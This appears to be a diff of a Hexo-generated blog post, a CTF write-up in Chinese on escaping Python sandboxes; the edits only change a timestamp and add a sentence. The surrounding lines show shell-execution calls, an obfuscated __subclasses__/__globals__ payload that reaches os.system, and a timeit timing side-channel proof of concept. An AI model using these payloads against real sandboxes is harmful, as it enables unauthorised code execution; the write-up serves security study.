@@ -22,7 +22,7 @@
 <meta property="og:url" content="http://yoursite.com/2017/10/22/Python-SandBox-Bypass/index.html">
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="0x00 shell执行函数os.system(&amp;apos;whoami&amp;apos;) os.popen(&amp;apos;whoami&amp;apos;).read() commands.getoutput(&amp;apos;whoami&amp;apos;) commands.getstatusoutput(&amp;apos;whoami&amp;apos;) subprocess.call([&amp;apos;whoami&amp;apos;]">
-<meta property="og:updated_time" content="2017-11-05T16:49:01.010Z">
+<meta property="og:updated_time" content="2017-11-05T16:58:02.052Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Python SandBox Bypass | Hexo">
 <meta name="twitter:description" content="0x00 shell执行函数os.system(&amp;apos;whoami&amp;apos;) os.popen(&amp;apos;whoami&amp;apos;).read() commands.getoutput(&amp;apos;whoami&amp;apos;) commands.getstatusoutput(&amp;apos;whoami&amp;apos;) subprocess.call([&amp;apos;whoami&amp;apos;]">
@@ -245,8 +245,7 @@ while 1:
 <pre><code>[c for c in [].__class__.__base__.__subclasses__() if c.__name__ == [m.__name__ for m in [i for i in [].__class__.__base__.__subclasses__() if &apos;&lt;class&apos; in str(i) and &apos;__globals__&apos; in dir(i.__init__)] if &apos;system&apos; in [n for n in m.__init__.__globals__.keys()]][0]][0].__init__.__globals__[&apos;sy&apos;+&apos;stem&apos;](&apos;whoami&apos;)
 </code></pre><p>可读性比较差了…</p>
 <p>这里这个这道题我是用sys先读出了他的python版本号(因为也删除了<code>str()</code>),再用对应的内置对象getshell.</p>
-<h4 id="0x03-Another-Way"><a href="#0x03-Another-Way" class="headerlink" title="0x03 Another Way"></a>0x03 Another Way</h4><p>use the timeit</p>
-<p>swpu2017年的ctf比赛,直接上poc:</p>
+<h4 id="0x03-Another-Way"><a href="#0x03-Another-Way" class="headerlink" title="0x03 Another Way"></a>0x03 Another Way</h4><p>use the timeit<br>swpu2017年的ctf比赛,直接上poc:</p>
 <pre><code>import timeit
 z=&quot;&quot;&quot;
 import time
@@ -260,7 +259,8 @@ def fuck_length(len):
 &quot;&quot;&quot;
 for i in range(0,29):
     print chr(int(timeit.timeit(&apos;fuck_length({0})&apos;.format(i),number=1,setup=z)*1000)),
-</code></pre><h4 id="0x04-links"><a href="#0x04-links" class="headerlink" title="0x04 links"></a>0x04 links</h4><pre><code>http://rickgray.me/use-python-features-to-execute-arbitrary-codes-in-jinja2-templates
+</code></pre><p>因为他这里似乎禁掉了回显的原因,所以就这样dirty hack了(:逃</p>
+<h4 id="0x04-links"><a href="#0x04-links" class="headerlink" title="0x04 links"></a>0x04 links</h4><pre><code>http://rickgray.me/use-python-features-to-execute-arbitrary-codes-in-jinja2-templates
 http://www.cnblogs.com/iamstudy/articles/python_eval_and_bypass_sandbox_study.html
 </code></pre>
   </section>
